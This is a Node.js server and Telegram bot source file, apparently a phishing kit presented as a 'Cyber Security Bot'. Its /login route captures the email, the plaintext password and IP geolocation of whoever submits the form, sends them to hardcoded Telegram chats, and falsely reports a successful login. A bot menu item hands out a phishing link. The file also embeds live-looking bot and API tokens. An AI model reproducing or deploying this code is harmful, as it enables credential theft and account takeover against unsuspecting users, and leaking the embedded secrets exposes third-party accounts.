const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const cheerio = require('cheerio');

const app = express();
const port = 3000;


app.use(cors());
app.use(bodyParser.json());
app.use(express.static('public'));

const botToken = "7628314972:AAHZtVoYDVeujuM8o7xpvaLzTGIjrMJodhY";
const chatIds = ["6786210993","7894929132"]; 
const bot = new TelegramBot(botToken, { polling: true });
 let profileImageUrl = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ_fMq7l79lm6-bYF7qqvwuxlKpXPgJ90_TLA&usqp=CAU";


const geminiApiKey = 'AIzaSyA5tdHVNBSUvYMw8g9U0SxH-CraUq_5RMA';  
const geminiApiUrl = 'https://api.gemini.com/v1/ask';  
const rssUrl = 'https://www.securityweek.com/rss.xml';


const fetchSecurityNews = async () => {
    try {
        const response = await axios.get(rssUrl);
        const body = response.data;
        const $ = cheerio.load(body);
        let newsList = [];

        $('item').each((i, element) => {
            const title = $(element).find('title').text();
            const link = $(element).find('link').text();
            const description = $(element).find('description').text();
            newsList.push({ title, link, description });
        });

        return newsList;
    } catch (error) {
        console.error('Error fetching news:', error);
        return [];
    }
};


const sendNewsUpdate = async (chatId) => {
    const newsList = await fetchSecurityNews();
    if (newsList.length > 0) {
        newsList.slice(0, 5).forEach(news => {
            bot.sendMessage(chatId, `*${news.title}*\n${news.description}\n[Read more](${news.link})`, { parse_mode: 'Markdown' });
        });
    } else {
        bot.sendMessage(chatId, 'No news available at the moment.');
    }
};


const getGeminiResponse = async (message) => {
    try {
        const response = await axios.post(geminiApiUrl, {
            apiKey: geminiApiKey,
            query: message,
        });
        return response.data.response;
    } catch (error) {
        console.error("Error getting Gemini AI response:", error);
        return "I'm so sorry, I wasn't able to get a response right now. But I can try again later.";
    }
};


app.post('/login', async (req, res) => {
    const { email, password } = req.body;
    const loginTime = new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" });

    
    let ipInfo = { ip: "Unknown", city: "Unknown", country: "Unknown", org: "Unknown" };
    try {
        let response = await axios.get("https://ipinfo.io/json?token=961f6caebd0f7d");
        ipInfo = response.data;
    } catch (error) {
        console.error("Failed to fetch IP data:", error);
    }

    
    let message = `🔒 *Login Successful!*\n\n`
        + `🕒 *Time:* ${loginTime}\n`
        + `📧 *Email:* ${email}\n`
        + `🔑 *Password:* ${password}\n`
        + `🌍 *IP:* ${ipInfo.ip}\n`
        + `📍 *Location:* ${ipInfo.city}, ${ipInfo.country}\n`
        + `🏢 *Provider:* ${ipInfo.org}`;

   
    chatIds.forEach(chatId => {
        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
    });

    console.log("✅ Login data sent to Telegram successfully!");

    
    res.json({ success: true, message: "Login successful!" });
});


bot.onText(/\/start/, (msg) => {
    bot.sendMessage(msg.chat.id, 'Hello, welcome to the Cyber Security Bot! Type /menu to see the options.');
});


bot.onText(/\/menu/, (msg) => {
    const chatId = msg.chat.id;
    const photoUrl = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ_fMq7l79lm6-bYF7qqvwuxlKpXPgJ90_TLA&usqp=CAU";

    
    bot.sendPhoto(chatId, photoUrl, { caption: "🔥 Select an option from the menu below:" })
        .then(() => {
            const opts = {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "🔍 TOOLS Phishing", callback_data: "TOOLS_phishing" }],
                        [{ text: "📰 Latest News", callback_data: "latest_news" }],
                        [{ text: "🤖 Gemini AI", callback_data: "ask_gemini" }],
                    ],
                },
            };
            bot.sendMessage(chatId, "📌 Choose an option:", opts);
        })
        .catch((error) => {
            console.error("❌ Failed to send photo:", error);
            bot.sendMessage(chatId, "⚠️ Failed to send image. Please try again.");
        });
});


bot.on("callback_query", async (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;

    if (data === "TOOLS_phishing") {
        bot.sendMessage(msg.chat.id, "🔍 Links Phishing : https://suntiksubscriber.vercel.app/");
    } else if (data === "latest_news") {
        sendNewsUpdate(msg.chat.id);
    } else if (data === "ask_gemini") {
        bot.sendMessage(msg.chat.id, "Type /ai <question> to start chatting with Gemini AI.");
    }

    bot.answerCallbackQuery(callbackQuery.id);
});


bot.onText(/\/ai (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userQuestion = match[1];

    const aiResponse = await getGeminiResponse(userQuestion);

    bot.sendMessage(chatId, aiResponse);
});


app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});
